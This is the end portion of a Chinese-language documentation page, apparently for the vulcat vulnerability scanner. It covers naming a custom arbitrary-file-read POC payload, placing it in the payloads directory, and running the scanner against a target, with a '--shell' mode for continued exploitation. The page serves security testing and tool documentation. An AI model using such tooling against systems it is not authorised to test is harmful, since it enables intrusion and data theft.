</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/14.png" alt=""><figcaption></figcaption></figure><p></p> <h2 id="_4-装填载荷"><a href="#_4-装填载荷" class="header-anchor">#</a> 4. 装填载荷</h2> <h3 id="_4-1-修改载荷文件名称"><a href="#_4-1-修改载荷文件名称" class="header-anchor">#</a> 4.1 修改载荷文件名称</h3> <p>命名规则：<b>框架名称-编号-漏洞类型</b></p> <ul><li>如果框架名称太长，可以使用 - 分隔</li> <li>可以同时存在多个漏洞类型，例如 apache-httpd-cve-2021-42013-rce-fileread</li></ul> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/16.png" alt=""><figcaption></figcaption></figure> <h3 id="_4-2-把载荷-放入载荷路径"><a href="#_4-2-把载荷-放入载荷路径" class="header-anchor">#</a> 4.2 把载荷 放入载荷路径</h3> <p>把大象装进冰箱需要几步？
把大象装进冰箱需要几步？
把大象装进冰箱需要几步？</p> <ol><li><p>打开<code>vulcat/config.yaml</code>查看载荷路径
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/17.png" alt=""><figcaption></figcaption></figure><p></p></li> <li><p>把刚刚编写的文件丢进<code>payloads/</code>目录
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/18.png" alt=""><figcaption></figcaption></figure><p></p></li> <li><p>关闭<code>vulcat/config.yaml</code>文件</p></li></ol> <p>（此步骤没有图片）</p> <h2 id="_5-扫描测试"><a href="#_5-扫描测试" class="header-anchor">#</a> 5. 扫描测试</h2> <p>现在，vulcat会自动识别你编写的载荷，你可以运行vulcat测试效果</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>python vulcat.py <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>目标地址<span class="token operator">&gt;</span> <span class="token parameter variable">--log</span> <span class="token number">3</span> <span class="token parameter variable">-v</span> <span class="token operator">&lt;</span>载荷名称<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/19.png" alt=""><figcaption></figcaption></figure> <p><code>-v/--vuln</code>选项支持模糊匹配，你不需要输入完整的载荷名称
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/20.png" alt=""><figcaption></figcaption></figure><p></p> <p>模糊匹配
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/21.png" alt=""><figcaption></figcaption></figure><p></p> <p><code>--shell</code>支持，可以使用该选项进入Shell交互模式，以持续利用漏洞：</p> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/22.png" alt=""><figcaption></figcaption></figure> <h2 id="_6-废话"><a href="#_6-废话" class="header-anchor">#</a> 6. 废话</h2> <p>你可以为载荷创建一个专门的目录，用于分类</p> <p>（不会影响载荷的效果，就算有几百层目录，vulcat也可以识别 并装填Payload）</p> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/23.png" alt=""><figcaption></figcaption></figure></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/carsaid/edit/master/docs/50.文档/10.《vulcat文档》/105.自定义POC和EXP/1052.vulcat自定义POC示例-任意文件读取漏洞.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/docs/vulcat/custom-payload/" class="page-nav-centre page-nav-centre-prev router-link-active"><div class="tooltip">说明</div></a> <a href="/docs/vulcat/custom-payload/exp/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">vulcat自定义EXP示例-文件上传漏洞</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/docs/vulcat/custom-payload/" class="prev router-link-active">说明</a></span> <span class="next"><a href="/docs/vulcat/custom-payload/exp/">vulcat自定义EXP示例-文件上传漏洞</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/vuln-db/web/weblogic/cve-2021-2109/"><div>
            weblogic-cve-2021-2109
            <!----></div></a> <span class="date">10-11</span></dt></dl><dl><dd>02</dd> <dt><a href="/vuln-db/web/thinkphp/cnvd-2018-24942/"><div>
            thinkphp-cnvd-2018-24942
            <!----></div></a> <span class="date">10-11</span></dt></dl><dl><dd>03</dd> <dt><a href="/vuln-db/web/joomla/cve-2023-23752/"><div>
            joomla-cve-2023-23752
            <!----></div></a> <span class="date">10-11</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="https://github.com/carsaid" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2023-2023
    <span>Carsaid | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.4c7eb560.js" defer></script><script src="/assets/js/2.b3e685a4.js" defer></script><script src="/assets/js/79.b396fb20.js" defer></script>
  </body>
</html>
